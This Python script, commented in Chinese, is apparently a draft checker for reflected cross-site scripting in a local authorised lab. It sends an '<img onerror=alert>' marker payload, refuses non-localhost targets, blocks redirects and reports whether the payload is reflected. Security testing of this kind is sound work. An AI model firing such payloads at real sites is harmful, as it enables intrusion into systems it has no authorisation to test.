#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XSS-002 本地授权靶场验证草案（无害标记，仅回显观察）。

仅允许 localhost/127.0.0.1/::1；不跟随重定向；不读取 Cookie、不外传数据。
未运行，需人工适配基址、路径、认证会话与查看渲染的浏览器步骤。
"""
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

PAYLOAD = "<img src=x onerror=alert('XSS002')>"


def build_url(base: str, path: str, param: str, payload: str) -> str:
    parts = urllib.parse.urlsplit(base)
    if parts.scheme not in ("http", "https"):
        raise ValueError("base URL scheme must be http or https: %r" % base)
    host = (parts.hostname or "").lower()
    if host not in ("localhost", "127.0.0.1", "::1"):
        raise ValueError("refusing non-local host: %r" % host)
    query = urllib.parse.urlencode({param: payload})
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, path, query, ""))


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        print("[!] redirect blocked: HTTP %s -> %s" % (code, newurl), file=sys.stderr)
        return None


def main() -> int:
    ap = argparse.ArgumentParser(description="XSS-002 local reflection check (harmless marker)")
    ap.add_argument("--base", required=True, help="e.g. http://127.0.0.1:8080")
    ap.add_argument("--path", required=True, help="vulnerable script path, e.g. /vulnerabilities/xss_r/")
    ap.add_argument("--param", default="name", help="GET parameter carrying the payload")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--session-cookie", default=None,
                    help="optional session cookie value for an authenticated lab session; not printed")
    args = ap.parse_args()

    url = build_url(args.base, args.path, args.param, PAYLOAD)
    req = urllib.request.Request(url, method="GET")
    req.add_header("User-Agent", "xss002-lab-check/1.0")
    if args.session_cookie:
        req.add_header("Cookie", "PHPSESSID=" + args.session_cookie)

    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=args.timeout) as resp:
            status = resp.status
            ctype = resp.headers.get("Content-Type", "")
            body = resp.read(200000).decode(resp.headers.get_content_charset() or "utf-8", "replace")
    except urllib.error.HTTPError as e:
        print("[!] HTTP error %s for %s" % (e.code, url), file=sys.stderr)
        return 2
    except urllib.error.URLError as e:
        print("[!] connection error: %s" % e.reason, file=sys.stderr)
        return 3

    print("[*] GET %s" % url)
    print("[*] HTTP %s, Content-Type: %s" % (status, ctype))
    reflected = PAYLOAD in body
    print("[*] raw payload present in response body: %s" % reflected)

    # 观察点：<pre> 上下文中标签未被编码即被视为反射。
    if reflected:
        print("[*] observation: payload reflected verbatim; browser execution NOT verified here.")
        print("[*] manual step: open the same URL in a lab browser and check for the alert('XSS002') dialog.")
    else:
        print("[*] observation: no verbatim reflection of the payload in the returned body.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
